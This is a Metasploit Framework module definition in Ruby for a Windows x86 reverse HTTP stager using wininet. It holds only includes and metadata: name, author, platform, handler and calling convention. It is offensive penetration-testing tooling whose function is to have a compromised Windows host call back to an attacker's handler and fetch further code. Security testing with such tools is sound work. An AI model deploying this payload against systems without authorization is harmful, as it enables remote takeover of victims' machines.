##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_http'
require 'msf/core/payload/windows/reverse_http'

module Metasploit4

  CachedSize = 327

  include Msf::Payload::Stager
  include Msf::Payload::Windows
  include Msf::Payload::Windows::ReverseHttp

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Windows Reverse HTTP Stager (wininet)',
      'Description' => 'Tunnel communication over HTTP (Windows wininet)',
      'Author'      => 'hdm',
      'License'     => MSF_LICENSE,
      'Platform'    => 'win',
      'Arch'        => ARCH_X86,
      'Handler'     => Msf::Handler::ReverseHttp,
      'Convention'  => 'sockedi http'))
  end

end
